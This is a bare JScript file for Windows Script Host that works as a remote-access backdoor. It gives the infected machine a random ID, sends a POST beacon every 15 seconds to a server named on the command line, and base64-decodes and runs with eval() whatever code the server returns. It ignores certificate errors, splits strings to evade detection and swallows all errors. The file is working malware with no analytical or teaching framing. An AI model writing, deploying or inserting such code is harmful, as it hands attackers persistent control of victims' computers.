var hsn="";
if (WScript.arguments.length>0){hsn=WScript.arguments(0);}else{WScript.Quit();}
var hp="http";
if (isNaN(hsn.substring(0,1))==true){hp="https";}
var saddr=hp+":"+"//"+hsn;
db64=function(s){
var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
for(i=0;i<64;i++){e[A.charAt(i)]=i;}
for(x=0;x<L;x++){
c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
}
return r;
};
function genu(){
var b=Math.floor(Math.random()*9)+1;
var ru=b.toString();
for(var i=1;i<8;i++){
var a=Math.floor(Math.random()*10);
ru=ru+a.toString();
}
return ru+WScript.arguments(1);
}
function prq(pd){
var sx=new ActiveXObject("MSXML2"+".Server"+"XMLH"+"TTP.6.0")
var rt="";
if (pd.length>0){
try {
sx.setOption(2,13056);
sx.open("PO"+"ST",saddr);
sx.setRequestHeader("Content"+"-"+"Type","application"+"/x"+"-www-"+"form-url"+"encoded");
sx.setRequestHeader("Content"+"-"+"Length",pd.length);
sx.send(pd);
rt=sx.responseText;
sx=null;
} catch (e){
}
}
return rt;
}
function ecval(dt){eval(dt);}
var uid=genu();
while(true){
	var s="a"+uid+"1";
	var rv=prq(s);
	if(rv.length>=1){
		try{
			eval(db64(rv));
		}catch (e){
		}
	}
	WScript.Sleep(15*1000);
}

